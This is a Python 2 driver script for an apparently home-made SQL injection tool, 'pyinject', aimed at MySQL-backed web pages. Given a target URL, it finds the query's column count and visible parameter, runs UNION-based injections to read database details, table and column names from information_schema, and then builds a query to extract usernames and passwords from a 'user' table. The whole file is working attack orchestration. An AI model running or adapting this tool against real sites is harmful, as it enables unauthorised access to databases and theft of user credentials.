#!/usr/bin/python
""" Driver program for pyinject. Handles user-defined options and calls appropriate modules.

    OPTIONS to support:
        -f:     \n-delimited text file of parameters to inject (default is mysql_params).
        -d:     Delimiter to use. Default is '/**/', also can use:
                                             '%20' 
        -db:    Database to try injections against (default is MySQL). Only MySQL supported as of now.
        -v:     Verbose mode.
"""

import os, sys, urllib2
import builder, datastore, injector, scanner, parser, reporter
import pprint
import json

if __name__ == '__main__':

    if len(sys.argv) == 1:
        print 'Help?'
        sys.exit(0)

    page = sys.argv[1]

    # whitespace-delimited file
    mysql_params = open('./lists/mysql/basic_union.txt').read().split()

    # Instantiate classes used
    build = builder.Builder(page, mysql_params)
    store = datastore.Store()
    fang = injector.Injector("")
    report = reporter.Reporter()
    parse = parser.Parser(store)

    # Get column data
    print '\n### Basic Page Structure ###'
    num_columns = fang.get_num_columns(page) 
    report.columns_in_statement(num_columns)
    magic_num = int(fang.get_visible_param(page))
    print '\tMagic Param','\t', magic_num

    # Get DB data
    print '\n### Basic DB Info ###'
    data = fang.injection(page, build.union(num_columns, magic_num)) 
    report.db_info(parse.db_values(data))
    data = fang.injection(page, build.schema_union(num_columns, magic_num)) 
    print '### Interesting Tables ###'
    report.tables(parse.information_schema(data))

    # Get table data
    print '\n### DB Table Info ###'
    data = fang.injection(page, build.columns(num_columns, magic_num)) 
    report.columns(parse.table_for_columns(data))
    print build.values(num_columns, magic_num, 'user', ['user_username', 'user_password'])



